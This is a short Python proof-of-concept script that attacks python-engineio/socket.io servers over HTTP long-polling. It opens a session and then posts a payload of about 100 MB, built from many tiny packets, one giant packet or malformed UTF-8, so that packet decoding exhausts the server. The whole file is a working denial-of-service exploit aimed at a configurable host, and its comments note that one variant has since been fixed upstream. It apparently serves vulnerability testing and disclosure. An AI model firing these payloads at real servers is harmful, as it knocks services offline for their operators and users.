import re
import time

import requests


def standard_payload(total_length):
    # 4 means MESSAGE in engineio (data[0])
    # 2 means EVENT (non-binary) in socketio (data[1])
    # data_length : data
    packet = '40:42["my event",{"data":"I\'m connected!"}]'
    repetitions = total_length // len(packet)
    return packet * repetitions


def giant_packet(total_length):
    # 4 means MESSAGE in engineio (data[0])
    # Then we follow with a massive integer
    # to cause iteration in socketio.Packet.decode
    prefix = '4'
    data_length = total_length - 2
    while data_length + 1 + len(str(data_length)) > total_length:
        data_length -= 1
    packet = '%d:%s' % (data_length, prefix + '2' * (data_length - len(prefix)))
    return packet


def many_tiny_packets(total_length, bad_utf8=False):
    # 4 means MESSAGE in engineio (data[0])
    # 2 means EVENT (non-binary) in socketio (data[1])
    # But previously putting a character >0x80 in data
    # slowed down encoded_payload.decode('utf-8', errors='ignore') even more
    # The bad_utf8 issue has now been fixed in python-engineio master
    packet = '2:4\xbc' if bad_utf8 else '2:42'
    repetitions = total_length // len(packet)
    return packet * repetitions


def timestr():
    return "&t=" + str(time.time())


def attack(host, payload_length=100000000, make_payload=many_tiny_packets):
    # engineio default max length is 10 meg
    base_url = host + "/socket.io/?EIO=3&transport=polling"
    # Create session
    response = requests.get(base_url + timestr()).text
    print("Response from server", repr(response))
    sid = re.search("\"sid\":\"([^\"]+)\"", response).group(1)
    print("Got session", sid)
    session_url = base_url + "&sid=" + sid
    # Fire payload
    payload = make_payload(payload_length)
    print("Firing payload of length", len(payload), repr(payload[:100]))
    final_response = requests.post(
        session_url + timestr(),
        data=payload,
        headers={'Content-Type': 'text/plain'},
    ).text
    print("Server returned", repr(final_response))


def x(payload_length=100000000, make_payload=many_tiny_packets):
    return attack("http://127.0.0.1:5000", payload_length, make_payload)
